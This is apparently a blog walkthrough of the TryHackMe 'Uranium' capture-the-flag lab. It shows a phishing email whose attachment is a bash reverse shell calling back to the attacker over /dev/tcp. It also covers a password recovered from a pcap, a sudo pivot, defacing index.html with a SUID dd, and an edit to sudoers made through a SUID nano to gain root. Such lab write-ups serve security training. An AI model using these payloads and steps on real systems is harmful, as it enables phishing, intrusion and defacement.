---
title: TryHackMe[URANIUM CTF]
author: Anurag M
date: 2021-08-31 00:30:00 +0800
categories: [TryHackMe]
tags: [ tryhackme, phishing, SUID, nano, dd ]
---

![uranium](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/uranium/uranium.jpeg)

In this room, you will learn about one of the phishing attack methods

## About The Machine

| Name | OS | Difficulty | Creator |
|------|----|------------|---------|
| [Uranium CTF](https://tryhackme.com/room/uranium)  | Linux | Hard | [hakanbey01](https://tryhackme.com/p/hakanbey01) |


## Reconnaissance
### Nmap

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $nmap -sC -sV -A -Pn 10.10.196.204
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a1:3c:d7:e9:d0:85:40:33:d5:07:16:32:08:63:31:05 (RSA)
|   256 24:81:0c:3a:91:55:a0:65:9e:36:58:71:51:13:6c:34 (ECDSA)
|_  256 c2:94:2b:0d:8e:a9:53:f6:ef:34:db:f1:43:6c:c1:7e (ED25519)
25/tcp open  smtp    Postfix smtpd
|_smtp-commands: uranium, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
| ssl-cert: Subject: commonName=uranium
| Subject Alternative Name: DNS:uranium
| Not valid before: 2021-04-09T21:40:53
|_Not valid after:  2031-04-07T21:40:53
|_ssl-date: TLS randomness does not represent time
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Uranium Coin
Service Info: Host:  uranium; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
WE can see that there are three open ports on the machine. 22, 25 and 80 which are atandard, ssh, smtp and HTTP ports.
But the creator hakanbey01 left his twitter account in the description for us, let's check that.

![uranium](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/uranium/twitter.png)

The creator has left some clues for us in his [twitter](https://twitter.com/hakanbe40520689) account.
1. We have a domain `uranium.thm`.
2. We have enough clues to guess the email id `hakanbey@uranium.thm`.
3. We can understand the user `hakanbey` opens the mail contents in his terminal if the file name is `application`.

## Gaining Foothold

We know that the user opens his mail in terminal if the file name is application, so let's create a reverse shell with file name `application`.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $cat application 
#!/bin/bash
bash -c "bash -i >& /dev/tcp/YOUR IP/1234 0>&1"
```
Now let's send the mail using `sendEmail` a commandline based SMTP email delivery program.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $sendEmail -t hakanbey@uranium.thm -f vincida@mail.com -s 10.10.196.204 -u "Shell" -m "Please Open" -o tls=no -a application
Aug 31 00:37:26 v1nc1d4 sendEmail[96687]: Email was sent successfully!
```

Few seconds later I got a shell back on my netcat listener.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.8.154.40] from (UNKNOWN) [10.10.196.204] 58254
bash: cannot set terminal process group (1738): Inappropriate ioctl for device
bash: no job control in this shell
hakanbey@uranium:~$
```
First flag can be found in the home directory.

```bash
hakanbey@uranium:~$ pwd
pwd
/home/hakanbey
hakanbey@uranium:~$ ls
ls
chat_with_kral4
mail_file
user_1.txt
hakanbey@uranium:~$ cat user_1.txt
cat user_1.txt 
thm{--REDACTED--}
hakanbey@uranium:~$
```

## Privilege Escalation

### kral4

In the home folder we can see a binary named `chat_with_kral4`, let's find out what it is..

```bash
hakanbey@uranium:~$ ls
chat_with_kral4
mail_file
user_1.txt
hakanbey@uranium:~$ file chat_with_kral4	
file chat_with_kral4 
chat_with_kral4: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=3cf57a90a14e7b2771cb14cd9b1837fe9fa7495b, for GNU/Linux 3.2.0, not stripped
hakanbey@uranium:~$ ./chat_with_kral4
./chat_with_kral4
PASSWORD :
```

It look's like a chat program, to interact with kral4, but to enter the program we need a `PASSWORD`

Enumerating the machine, we can find a pcap file in `var/log` let's download the file to our local machine using `wget` and read it with `wirshark` and check if we can find something juicy.

```bash
┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $wget 10.10.196.204:8000/hakanbey_network_log.pcap
--2021-08-31 00:51:22--  http://10.10.196.204:8000/hakanbey_network_log.pcap
Connecting to 10.10.196.204:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1869 (1.8K) [application/vnd.tcpdump.pcap]
Saving to: ‘hakanbey_network_log.pcap’

hakanbey_network_log.pcap               100%[===============================================================================>]   1.83K  --.-KB/s    in 0s      

2021-08-31 00:51:24 (84.8 MB/s) - ‘hakanbey_network_log.pcap’ saved [1869/1869]

┌─[v1nc1d4@V1NC1D4]─[~/Desktop/THM/uranium]
└──╼ $ls
hakanbey_network_log.pcap
```

We have the *pcap file, let's open with wireshark.

![uranium](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/uranium/pass.png)

following the TCP stream we get the plain text password.

Now we have the password, let's chat

```bash
hakanbey@uranium:~$ ls
ls
chat_with_kral4  mail_file  user_1.txt
hakanbey@uranium:~$ ./chat_with_kral4
./chat_with_kral4
PASSWORD : [REDACTED]
[REDACTED]
kral4:hi hakanbey

->hi
hi
hakanbey:hi
kral4:how are you?

->fine
fine
hakanbey:fine
kral4:what now? did you forgot your password again

->yes
yes
hakanbey:yes
kral4:okay your password is [REDACTED] don't lose it PLEASE
kral4:i have to go
kral4 disconnected

connection terminated
hakanbey@uranium:~$
```

We have user `hakanbey's` password, let's check sudo rights.

```bash
hakanbey@uranium:~$ sudo -l
sudo -l
[sudo] password for hakanbey: [REDACTED]

Matching Defaults entries for hakanbey on uranium:
    env_reset,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User hakanbey may run the following commands on uranium:
    (kral4) /bin/bash
hakanbey@uranium:~$
```

So user `hakanbey` is allowed to run `/bin/bash` sudo, but the `bin/bash` belongs to user `kral4` which means we can escalate our privilege to user `kral4`

```bash

hakanbey@uranium:~$ sudo -u kral4 /bin/bash
sudo -u kral4 /bin/bash
kral4@uranium:~$ id
id
uid=1001(kral4) gid=1001(kral4) groups=1001(kral4)
kral4@uranium:~$
```

The second find can be found under the directory `/home/kral4`

```bash
kral4@uranium:/home/kral4$ pwd
pwd
/home/kral4
kral4@uranium:/home/kral4$ ls
ls
chat_with_hakanbey  user_2.txt
kral4@uranium:/home/kral4$ cat user_2.txt
cat user_2.txt
thm{REDACTED}
kral4@uranium:/home/kral4$
```
### root

Digging deep into the machine, we can find an intersting mail for kral4 in `var/mail` directory.

```bash
kral4@uranium:/home/kral4$ cd /var/mail
cd /var/mail
kral4@uranium:/var/mail$ ls
ls
hakanbey  kral4
kral4@uranium:/var/mail$ ls
ls
hakanbey  kral4
kral4@uranium:/var/mail$ cat kral4
cat kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id C7533401C2
	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--


kral4@uranium:/var/mail$
```

From the mail we can undrstand that, the user `root` has sent a mail to `kral4` saying that "if we get an attack again, I will give `SUID` to the `nano` binary in your home folder"

This means that somehow we have to initiate an attack against on `index.html` 

Trying to manipulate `index.html` failed because we do not have write permission.
So, let's check for interesting `SUID` binaries, with which we can initiate attack against `index.html`

```bash
kral4@uranium:/var/mail$ find / -perm -u=s -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
/usr/lib/snapd/snap-confine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/passwd
/usr/bin/newuidmap
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/newgidmap
/usr/bin/chfn
/usr/bin/at
/usr/bin/sudo
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/mount
/bin/dd
kral4@uranium:/var/mail$
```

We have something interesting, `dd` can be used to wtite data files.
We can use it to manipulate `index.html`.
Look what [gtfobins](https://gtfobins.github.io/gtfobins/dd/) have to say about `dd`

![doctor](https://raw.githubusercontent.com/vincidadesigns/vincidadesigns.github.io/main/assets/img/posts/uranium/dd.png)

Again going back to the mail, the `root` user will give `SUID` to the `nano` binary in the `home` folder, which means that the `nano` binary should be placed at `home` folder. So let's copy `nano` to the user `kral4's` home folder.

```bash
kral4@uranium:/home/kral4$ cp /bin/nano .
cp /bin/nano .
kral4@uranium:/home/kral4$ ls
ls
chat_with_hakanbey  nano  user_2.txt
kral4@uranium:/home/kral4$
```

Now let's manipulate `index.html` with `dd`

```bash
kral4@uranium:/home/kral4$ LFILE=/var/www/html/index.html
LFILE=/var/www/html/index.html
kral4@uranium:/home/kral4$ echo "Hacked by vincida" | /bin/dd of=$LFILE
echo "Hacked by vincida" | /bin/dd of=$LFILE
0+1 records in
0+1 records out
18 bytes copied, 0.000473648 s, 38.0 kB/s
kral4@uranium:/home/kral4$
You have new mail in /var/mail/kral4
```
We got a new mail for `kral4`

```bash
kral4@uranium:/home/kral4$ cat /var/mail/kral4
cat /var/mail/kral4
From root@uranium.thm  Sat Apr 24 13:22:02 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id C7533401C2
	for <kral4@uranium.thm>; Sat, 24 Apr 2021 13:22:02 +0000 (UTC)
Message-ID: <841530.943147035-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Sat, 24 Apr 2021 13:22:02 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-992935.514616878"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-992935.514616878
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I give SUID to the nano file in your home folder to fix the attack on our  index.html. Keep the nano there, in case it happens again.

------MIME delimiter for sendEmail-992935.514616878--


From root@uranium.thm  Mon Aug 30 20:00:26 2021
Return-Path: <root@uranium.thm>
X-Original-To: kral4@uranium.thm
Delivered-To: kral4@uranium.thm
Received: from uranium (localhost [127.0.0.1])
	by uranium (Postfix) with ESMTP id 72D52401A1
	for <kral4@uranium.thm>; Mon, 30 Aug 2021 20:00:26 +0000 (UTC)
Message-ID: <683137.666524516-sendEmail@uranium>
From: "root@uranium.thm" <root@uranium.thm>
To: "kral4@uranium.thm" <kral4@uranium.thm>
Subject: Hi Kral4
Date: Mon, 30 Aug 2021 20:00:26 +0000
X-Mailer: sendEmail-1.56
MIME-Version: 1.0
Content-Type: multipart/related; boundary="----MIME delimiter for sendEmail-278858.953927742"

This is a multi-part message in MIME format. To properly display this message you need a MIME-Version 1.0 compliant Email program.

------MIME delimiter for sendEmail-278858.953927742
Content-Type: text/plain;
        charset="iso-8859-1"
Content-Transfer-Encoding: 7bit

I think our index page has been hacked again. You know how to fix it, I am giving authorization.

------MIME delimiter for sendEmail-278858.953927742--
```

The mail says that the `root` user has authorized `SUID` privilege to `nano` binary. Let's check it.

```bash
kral4@uranium:/home/kral4$ ls -la
ls -la
total 384
drwxr-x--- 3 kral4 kral4   4096 Aug 30 20:05 .
drwxr-xr-x 4 root  root    4096 Apr 23 08:50 ..
lrwxrwxrwx 1 root  root       9 Apr 25 11:12 .bash_history -> /dev/null
-rw-r--r-- 1 kral4 kral4    220 Apr  9 21:55 .bash_logout
-rw-r--r-- 1 kral4 kral4   3771 Apr  9 21:55 .bashrc
-rwxr-xr-x 1 kral4 kral4 109960 Apr  9 16:35 chat_with_hakanbey
-rw-r--r-- 1 kral4 kral4      5 Aug 30 19:31 .check
drwxrwxr-x 3 kral4 kral4   4096 Apr 10 00:21 .local
-rwsrwxrwx 1 root  root  245872 Aug 30 20:05 nano
-rw-r--r-- 1 kral4 kral4    807 Apr  9 21:55 .profile
-rw-rw-r-- 1 kral4 kral4     38 Apr 10 00:21 user_2.txt
kral4@uranium:/home/kral4$
```

Perfect..! We have `SUID` in the `nano` binary, since we know user `hakanbeys` password, let's add `hakanbey` to the sudoers group.

```bash
# User privilege specification
root            ALL=(ALL:ALL) ALL
hakanbey        ALL=(ALL:ALL) ALL 
```

Now let's get root shell by just executing `sudo su` from user `hakanbey's` account.

```bash
hakanbey@uranium:~$ sudo su
sudo su
root@uranium:/home/hakanbey#
```

We are `root` now, let's find rest flags.

`web_flag` can be found in `/var/www/html` directory

```bash
root@uranium:/home/kral4# cd /var/www/html
cd /var/www/html
root@uranium:/var/www/html# ls
ls
assets  images  index.html  LICENSE.txt  README.txt  web_flag.txt
root@uranium:/var/www/html# cat web_flag.txt
cat web_flag.txt
thm{REDACTED}
root@uranium:/var/www/html#
```

`root` flag can be founf under `/root` folder

```bash
root@uranium:~# pwd
pwd
/root
root@uranium:~# ls
ls
htmlcheck.py  root.txt
root@uranium:~# cat root.txt
cat root.txt
thm{REDACTED}
root@uranium:~# 
```

## Resources

| Topic | Url |
|-------|-----|
| GTFOBins-dd | [Click here](https://gtfobins.github.io/gtfobins/dd/) |
